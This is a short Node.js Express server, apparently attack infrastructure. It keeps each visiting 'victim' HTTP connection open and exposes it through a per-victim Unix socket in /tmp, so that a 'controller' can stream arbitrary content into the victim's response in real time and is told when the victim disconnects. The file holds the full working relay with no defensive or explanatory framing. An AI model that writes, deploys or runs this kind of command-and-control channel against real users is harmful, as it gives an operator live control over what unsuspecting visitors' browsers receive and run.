const express = require('express');
const fs = require('fs');
const https = require('https');
const http = require('http');
const net = require('net');

const options = {
  // key: fs.readFileSync("./key.pem"),
  // cert: fs.readFileSync("./cert.pem")
};

const app = express();

app.get('/', (req, res) => {
  const fileName = `/tmp/victim-${req.socket.remoteAddress.replace(/[.:]/g, '-')}.sock`;
  try {
    // delete socket in case it's still there
    fs.unlinkSync(fileName);
  } catch (e) { }

  let controllerStream;

  var server = net.createServer(stream => {
    controllerStream = stream;
    stream.on('data', c => {
      console.log('Controller -> Victim:', c.toString());
      res.write(c.toString());
    });
    stream.on('end', () => {
      console.log('Controller ended the stream');
      server.close();
      res.end();
      controllerStream = null;
    });
  });

  req.on('close', () => {
    const errorMsg = `Victim HTTP connection closed`;
    console.log(errorMsg);
    if (controllerStream) {
      controllerStream.write(errorMsg);
    }
    server.close(function () {
      console.log('Controller socket correctly closed');
      server.unref();
      try {
        // Best effort delete socket
        fs.unlinkSync(fileName);
      } catch (e) { }
    });
  });

  server.listen(fileName);
});


// https.createServer(options, app).listen(1338);
http.createServer(options, app).listen(1338);
